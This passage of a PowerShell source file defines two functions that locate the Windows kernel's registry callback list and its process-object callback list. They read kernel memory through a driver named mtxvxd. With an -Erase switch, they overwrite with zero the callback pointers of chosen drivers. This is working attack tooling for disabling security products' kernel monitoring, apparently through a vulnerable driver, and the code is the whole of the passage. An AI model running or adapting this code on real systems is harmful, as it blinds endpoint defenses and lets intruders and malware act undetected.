    }
}
Function Get-RegistryCallbacks {
    
    # No Erase
    #param (
    #    [String[]]$Slot,
    #    [switch]$Erase
    #)

    # 1. Resolve Internal RVA
    $hMod = Ldr-LoadDll -dwFlags SEARCH_SYS32 -dll ntoskrnl.exe
    $Ptr = [IntPtr]::Zero
    $Global:ntdll::LdrGetProcedureAddressForCaller($hMod, (Init-NativeString 'CmUnRegisterCallback' -Encoding Ansi), 0, [ref]$Ptr, 0, 0) | Out-Null
    $InternalRVA = [Int64]($Ptr - $hMod.ToInt64())

    # Safe Address
    # $StubPtr = [IntPtr]::Zero
    # $Global:ntdll::LdrGetProcedureAddressForCaller($hMod, (Init-NativeString 'DbgBreakPoint' -Encoding Ansi), 0, [ref]$StubPtr, 0, 0) | Out-Null
    # $KBase = Get-KernelBaseAddress
    # $StubInternalRVA = [Int64]($StubPtr - $hMod.ToInt64())
    # $SafeStubAddress = [int64]$KBase + $StubInternalRVA + 1
    $SafeStubAddress = [IntPtr]::Zero

    # 2. Resolve Modules
    $sz = 0; $NtApi::RtlQueryModuleInformation([ref]$sz, 0x110, 0) | Out-Null
    $mBuf = [Marshal]::AllocHGlobal($sz); $ModuleList = @()
    if ($NtApi::RtlQueryModuleInformation([ref]$sz, 0x110, $mBuf) -eq 0) {
        for ($i=0; $i -lt ($sz/0x110); $i++) {
            $e = [IntPtr]::Add($mBuf, ($i * 0x110))
            $ModuleList += [PSCustomObject]@{ B=[int64]([Marshal]::ReadIntPtr($e,0)); E=[int64]([Marshal]::ReadIntPtr($e,0))+[Marshal]::ReadInt32($e,8); N=[Marshal]::PtrToStringAnsi([IntPtr]::Add($e,14)).Substring([Marshal]::ReadInt16($e,12)) }
        }
    }; [Marshal]::FreeHGlobal($mBuf)

    # 3. Locate Live Array
    $KBase = Get-KernelBaseAddress
    $RoutineAddr = [int64]$KBase + $InternalRVA
    $va = Map-VirtualAddress -VA ([IntPtr]$RoutineAddr) -BlockSize 250 -DriverName mtxvxd
    $fBuf = New-Object Byte[] 250
    if ($va) { [Marshal]::Copy($va, $fBuf, 0, 250); Unmap-VirtualAddress $va -DriverName mtxvxd | Out-Null }
    # Search for the LEA RCX, [CmpCallbackListHead] pattern (48 8D 0D)
    $idx = -1
    for($i=0; $i -lt 240; $i++){
        if($fBuf[$i] -eq 0x48 -and $fBuf[$i+1] -eq 0x8D -and $fBuf[$i+2] -eq 0x0D){
            $idx = $i; break
        }
    }

    if ($idx -eq -1) { Write-Error "Pattern not found"; return }

    # Calculate absolute address of CmpCallbackListHead
    $RelOffset = [BitConverter]::ToInt32($fBuf, $idx + 3)
    $ListHeadAddr = [int64]($RoutineAddr + $idx + 7 + $RelOffset)

    if (-not $Erase.IsPresent) {
        Write-Host
        Write-Host "----- ENTRY DUMP -----"
    }

    # 4. Walk the Doubly-Linked List
    $Iter = 0
    $MaxIter = 100
    $CurrentLink = Read-VirtualAddress -VA ([IntPtr]$ListHeadAddr) -AsLong # Flink
    $CurrentLink = Read-VirtualAddress -VA([IntPtr]$ListHeadAddr) -AsLong


    while ($CurrentLink -ne $ListHeadAddr -and $Iter -lt $MaxIter) {
        # Offset 0x28 is the Callback Function (as seen in the CmUnRegister source)
        $FuncPtr = Read-VirtualAddress -VA ([IntPtr]($CurrentLink + 0x28)) -AsLong
        $Cookie  = Read-VirtualAddress -VA ([IntPtr]($CurrentLink + 0x18)) -AsLong

        $Owner = "Unknown"
        foreach ($Mod in $ModuleList) {
            if ($FuncPtr -ge $Mod.B -and $FuncPtr -lt $Mod.E) { $Owner = $Mod.N; break }
        }

        if ($Erase.IsPresent) {
            if ($Owner -in $Slot) {
                #Write-Int64 -Address ([Intptr]::Add($CurrentLink, 0x28)) -Value 0L | Out-Null
                $va = Map-VirtualAddress `
                    -VirtualAddress $CurrentLink `
                    -BlockSize 0x30 `
                    -DriverName mtxvxd
                if ($va -ne $null) {
                    [marshal]::WriteInt64($va, 0x28, 0L)
                    Write-Host "Slot $Owner has been nullified." -ForegroundColor Green
                    Write-Host
                    Unmap-VirtualAddress `
                        -MappedAddress $va `
                        -DriverName MtxVxd | Out-Null
                }
            }
        } else {
            Write-Host "[Cookie: 0x$($Cookie.ToString('X16'))] " -NoNewline
            Write-Host "$($Owner.PadRight(15))" -ForegroundColor Yellow -NoNewline
            Write-Host " | Function: 0x$($FuncPtr.ToString('X16'))"
        }

        # Move to next Flink (at offset 0x00)
        $CurrentLink = Read-VirtualAddress -VA ([IntPtr]$CurrentLink) -AsLong
        $Iter++
    }
}
Function Get-ObRegisterCallback {
    param (
        [String[]]$Slot,
        [switch]$Erase
    )

    # use PsProcessType Table
    $ProcedureAddress = [IntPtr]::Zero
    $hModule = Ldr-LoadDll -dwFlags SEARCH_SYS32 -dll ntoskrnl.exe
    $AnsiPtr = Init-NativeString -Value 'PsProcessType' -Encoding Ansi
    $Global:ntdll::LdrGetProcedureAddressForCaller($hModule, $AnsiPtr, 0, [ref]$ProcedureAddress, 0, 0) | Out-Null
    Free-NativeString -StringPtr $AnsiPtr
    if($ProcedureAddress -ne 0L) {
        $InternalRVA = [Int64]($ProcedureAddress - $hModule.ToInt64())
    }

    # Safe Address
    # $StubPtr = [IntPtr]::Zero
    # $Global:ntdll::LdrGetProcedureAddressForCaller($hMod, (Init-NativeString 'DbgBreakPoint' -Encoding Ansi), 0, [ref]$StubPtr, 0, 0) | Out-Null
    # $KBase = Get-KernelBaseAddress
    # $StubInternalRVA = [Int64]($StubPtr - $hMod.ToInt64())
    # $SafeStubAddress = [int64]$KBase + $StubInternalRVA + 1
    $SafeStubAddress = [IntPtr]::Zero

    $KBase = Get-KernelBaseAddress
    $RoutineAddr = [int64]$KBase + $InternalRVA
    $PsProcessTypeAddr = [IntPtr](Read-VirtualAddress -VA $RoutineAddr -AsLong)

    $ConfirmedOffset = 0
    foreach ($Offset in @(0xC8, 0xC0, 0xD0)) {
        $PotentialHead = [IntPtr]::Add($PsProcessTypeAddr, $Offset)
        $Flink = [IntPtr](Read-VirtualAddress -VA $PotentialHead -AsLong)
        if ($Flink.ToInt64() -lt 0) {
            $BlinkOfNext = [IntPtr](Read-VirtualAddress -VA([IntPtr]::Add($Flink, 8)) -AsLong)
            if ($BlinkOfNext.ToInt64() -eq $PotentialHead.ToInt64()) {
                $ConfirmedOffset = $Offset
                break
            }
        }
    }
    if ($ConfirmedOffset -eq 0) { return }

    # 2. Resolve Modules
    $sz = 0; $NtApi::RtlQueryModuleInformation([ref]$sz, 0x110, 0) | Out-Null
    $mBuf = [Marshal]::AllocHGlobal($sz); $ModuleList = @()
    if ($NtApi::RtlQueryModuleInformation([ref]$sz, 0x110, $mBuf) -eq 0) {
        for ($i=0; $i -lt ($sz/0x110); $i++) {
            $e = [IntPtr]::Add($mBuf, ($i * 0x110))
            $ModuleList += [PSCustomObject]@{ B=[int64]([Marshal]::ReadIntPtr($e,0)); E=[int64]([Marshal]::ReadIntPtr($e,0))+[Marshal]::ReadInt32($e,8); N=[Marshal]::PtrToStringAnsi([IntPtr]::Add($e,14)).Substring([Marshal]::ReadInt16($e,12)) }
        }
    }; [Marshal]::FreeHGlobal($mBuf)

    $ListHead = [IntPtr]::Add($PsProcessTypeAddr, $ConfirmedOffset)
    $CurrentLink = [IntPtr](Read-VirtualAddress -VA $ListHead -AsLong)
    $MaxIter = 1000
    $Iter = 0

    if (-not $Erase.IsPresent) {
        Write-Host
        Write-Host "----- ENTRY DUMP -----"
    }

    while ($CurrentLink.ToInt64() -ne $ListHead.ToInt64() -and $CurrentLink.ToInt64() -ne 0 -and $Iter -lt $MaxIter) {
        
        # PreOperation callback
        $PreOp = [IntPtr](Read-VirtualAddress -VA([IntPtr]::Add($CurrentLink, 0x28)) -AsLong)
    
        # Identify driver
        $DriverName = "Unknown"
        foreach ($Mod in $ModuleList) {
            if ($PreOp.ToInt64() -ge $Mod.B -and $PreOp.ToInt64() -lt $Mod.E) {
                $DriverName = $Mod.N
                break
            }
        }

        if ($Erase.IsPresent) {
            if ($DriverName -in $Slot) {
                Write-VirtualAddress -VA ([Intptr]::Add($CurrentLink, 0x28)) -Long 0L | Out-Null
                Write-Host "Slot $DriverName  has been nullified." -ForegroundColor Green
                Write-Host
            }
        } else {
            Write-Host "[Link: 0x$($CurrentLink.ToInt64().ToString('X16'))] -> Driver: $DriverName | PreOp: 0x$($PreOp.ToInt64().ToString('X16'))"
        }

        # Next in list
        $CurrentLink = [IntPtr](Read-VirtualAddress -VA $CurrentLink -AsLong)
        $Iter++
    }
}
